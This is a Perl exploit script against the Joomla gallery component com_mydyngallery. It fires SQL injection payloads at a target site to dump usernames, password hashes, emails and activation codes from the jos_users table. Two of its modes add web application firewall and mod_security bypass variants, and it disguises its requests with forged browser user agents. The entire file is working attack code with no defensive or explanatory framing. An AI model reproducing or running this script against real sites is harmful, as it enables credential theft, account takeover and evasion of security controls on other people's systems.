#!/usr/bin/perl
use IO::Socket::INET;
use LWP::UserAgent;
use Cwd qw();
my $path = Cwd::cwd();

print "\n";
print "\n\n";
$target = $ARGV[0];
$component = $ARGV[1];
if($target eq '' || $component eq '')
{
print "\n";
exit(1);
}

open(FILE, "> contents11.txt");

if($target !~ /http:\/\//)
{
$target = "http://$target";
}

sleep 1.5;
$agent = LWP::UserAgent->new();
$agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1');


if($component == 1)
{
$host = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1' union select 1,2,3,group_concat(0x3c62723e,username,0x3a,password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34 from jos_users%60";
print " . . Injecting $target . . With Simple Sqli  \n\n";
sleep 1;
$req = $agent->request(HTTP::Request->new(GET=>$host));
$content = $req->content;
if($content =~ /([0-9a-fA-F]{32})/)
{
$password = $1;
print "[+] Password found --> $password :) .\n\n";
sleep 1;
}
else
{
print "[-] Password not found :s Try The Second Method To Bypass WAF Security :( . \n\n";
}
}



if($component == 2)

{
print " . . Injecting $target . . With Smart WAF Bypass Methods |Have a cigaret| ^_^ and be patient \n\n";
sleep 1;
print " . . Loading mod_security Bypass and 406 error Bypass and Other Bypass . . Please wait ^_^ . .Drink a Cofee xD ! \n\n";
$host = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1' /*!00000union*/ select 1,2,3,group_concat/*!(0x3c62723e,username,0x3a,password)*/,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34 /*!from*/ jos_users%60";
$host1 = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1'%20/*!00000union*/%20select%201,2,3,group_concat/*!(0x3c62723e,username,0x3a,password)*/,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%20/*!from*/%20jos_users%60";
$host2 = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1'%20/*!00000union*/%23MadMan%0aselect%201,2,3,group_concat/*!(0x3c62723e,username,0x3a,password)*/,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%20/*!from*/%23MadMan%0ajos_users%60";


@hosts = ($host,$host1,$host2);
foreach $hos(@hosts)
{
sleep 1;
$req = $agent->request(HTTP::Request->new(GET=>$hos));
$content = $req->content;
if($content =~ /([0-9a-fA-F]{32})/)
{
$password = $1;
print "Password found --> $password :) . \n\n";
sleep 1;
}
else
{
print "Component com_mydyngallery of $target is patched  :( . \n\n";
sleep 1;
}
}
}

if($component == 3)

{
print "Copying Datas To $path ^_^\n";
sleep 1;

$agent = LWP::UserAgent->new();
$agent->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)') ;
$host = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1' union select 1,2,3,group_concat(username,0x3a,0x3a,0x3a,0x3a,email,0x3a,0x3a,activation,0x3a,usertype),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34 from jos_users%60";
$req = $agent->request(HTTP::Request->new(GET=>$host));
if($req->is_success && $req->content =~ /::::/ )
{
open(FILE, "> content.txt");
print FILE $req->content;
close(FILE);
$grep = "grep '::::' content.txt > content1.txt";
}

else
{
print "[-] Datas Can't Be Copied :( ";
}
}



if($component == 4)

{
print "Copying Datas To $path ^_^\n";
sleep 1;

$agent = LWP::UserAgent->new();
$agent->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)') ;
print " . . Using ForceCopy Method To Retrieve Datas ... \n\n";
$host = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1' /*!00000union*/ select 1,2,3,group_concat/*!(username,0x3a,0x3a,0x3a,0x3a,email,0x3a,0x3a,activation,0x3a,usertype)*/,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34 /*!from*/ jos_users%60";
$host1 = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1'%20/*!00000union*/%20select%201,2,3,group_concat/*!(username,0x3a,0x3a,0x3a,0x3a,email,0x3a,0x3a,activation,0x3a,usertype)*/,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%20/*!from*/%20jos_users%60";
$host2 = $target . "/index.php?option=com_mydyngallery&Itemid=&task=liste&directory=1'%20/*!00000union*/%23MadMan%0aselect%201,2,3,group_concat/*!(username,0x3a,0x3a,0x3a,0x3a,email,0x3a,0x3a,activation,0x3a,usertype)*/,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%20/*!from*/%23MadMan%0ajos_users%60";

@hosts = ($host,$host1,$host2);
foreach $hos(@hosts)
{
$req = $agent->request(HTTP::Request->new(GET=>$hos));
if($req->is_success && $req->content =~ /::::/ )

{
open(FILE, "> content.txt");
print FILE $req->content;
close(FILE);
$grep = "grep '::::' content.txt > content1.txt";
}

else
{
print "[-] Method Failed on $target :( ";
}
}
}